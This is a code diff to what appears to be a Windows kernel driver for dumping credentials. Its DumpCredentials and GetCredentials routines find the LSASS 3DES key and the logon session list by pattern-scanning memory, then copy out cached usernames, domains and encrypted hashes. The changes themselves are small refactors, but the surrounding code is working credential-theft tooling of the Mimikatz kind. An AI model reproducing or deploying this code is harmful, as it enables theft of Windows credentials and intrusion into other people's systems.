@@ -35,9 +35,9 @@ MemoryHandler::~MemoryHandler() {
 		if (this->cachedLsassInfo.Count != 0) {
 			for (ULONG i = 0; i < this->cachedLsassInfo.Count; i++) {
 				if (this->cachedLsassInfo.Creds[i].Username.Length > 0) {
-					FreeUnicodeString(&this->cachedLsassInfo.Creds[i].Username);
-					FreeUnicodeString(&this->cachedLsassInfo.Creds[i].Domain);
-					FreeUnicodeString(&this->cachedLsassInfo.Creds[i].EncryptedHash);
+					RtlFreeUnicodeString(&this->cachedLsassInfo.Creds[i].Username);
+					RtlFreeUnicodeString(&this->cachedLsassInfo.Creds[i].Domain);
+					RtlFreeUnicodeString(&this->cachedLsassInfo.Creds[i].EncryptedHash);
 				}
 			}
 			this->cachedLsassInfo.Count = 0;
@@ -668,13 +668,11 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		}
 
 		PVOID lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
-			sizeof(IvDesKeyLocation), lsasrvMain,
-			IvDesKeyLocationDistance, NULL, 0);
+			sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, NULL, 0);
 
 		if (!lsaInitializeProtectedMemory) {
 			lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
-				sizeof(IvDesKeyLocation), lsasrvMain,
-				IvDesKeyLocationDistance, NULL, 0, true);
+				sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, NULL, 0, true);
 
 			if (!lsaInitializeProtectedMemory) {
 				status = STATUS_NOT_FOUND;
@@ -694,7 +692,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		// Getting 3DES key
 		PULONG desKeyAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(DesKeySignature), 0xCC,
 			sizeof(DesKeySignature), lsaInitializeProtectedMemory, LsaInitializeProtectedMemoryLen,
-			&foundIndex, DesKeyOffset));
+			DesKeyOffset, &foundIndex));
 
 		if (!desKeyAddressOffset) {
 			status = STATUS_NOT_FOUND;
@@ -702,7 +700,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		}
 		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) + 
 			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
-		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY), STATUS_NOT_FOUND);
+		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY));
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -728,7 +726,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		// Getting LogonSessionList
 		PULONG logonSessionListAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(LogonSessionListSignature), 0xCC,
 			sizeof(LogonSessionListSignature), lsaEnumerateLogonSessionStart, WLsaEnumerateLogonSessionLen,
-			&foundIndex, LogonSessionListOffset));
+			LogonSessionListOffset, &foundIndex));
 
 		if (!logonSessionListAddressOffset) {
 			status = STATUS_NOT_FOUND;
@@ -740,7 +738,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 
 		logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(AlignAddress(reinterpret_cast<ULONGLONG>(logonSessionListAddress)));
 
-		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS), STATUS_NOT_FOUND);
+		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS));
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -866,7 +864,7 @@ NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
 		return status;
 
 	for (i = 0; i < credentials->Count; i++) {
-		status = ProbeAddress(&credentials->Creds[i], sizeof(Credentials), sizeof(Credentials), STATUS_INVALID_ADDRESS);
+		status = ProbeAddress(&credentials->Creds[i], sizeof(Credentials), sizeof(Credentials));
 
 		if (!NT_SUCCESS(status))
 			break;
